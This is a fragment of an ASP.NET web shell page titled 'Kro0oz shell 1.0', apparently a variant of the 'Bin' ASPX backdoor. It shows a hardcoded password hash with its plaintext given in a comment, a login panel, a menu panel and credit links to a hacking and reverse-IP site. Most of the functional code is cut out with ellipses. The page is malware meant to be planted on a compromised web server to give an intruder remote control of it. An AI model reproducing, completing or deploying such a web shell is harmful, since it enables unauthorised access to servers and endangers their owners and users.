...
<script runat="server">
    public string Password = "84356454f239dfec4114a2bd29dd970b";//PASS:google
    public string SessionName = "Mr Solo";
...
<head runat="server">
    <title>Kro0oz shell 1.0 -> Bin:)</title>
<style type="text/css">
    A:link {
...
<body>
    <form id="form1" runat="server"><div style="text-align: center"><asp:Panel ID="Bin_LoginPanel" runat="server" Height="47px" Width="401px">
            ...
            <asp:Button ID="LoginButton" runat="server" Text="??" OnClick="LoginButton_Click" /><p />
            Copyright (C) 2016 Bin -> <a href="http://Kro0oz" target="_blank">hacked</a></asp:Panel><asp:Panel ID="Bin_MenuPanel" runat="server" Height="56px" Width="771px">
            ...
            <asp:Label ID="Bin_ErrorLabel" runat="server" EnableViewState="False">Copyright (C) 2016 Bin -> <a href="KRo0oz" target="_blank">wis</a> -> <a href="http://www.rootkit.net.cn/index.aspx" target="_blank">Reverse-IP</a> </asp:Label></asp:Panel>
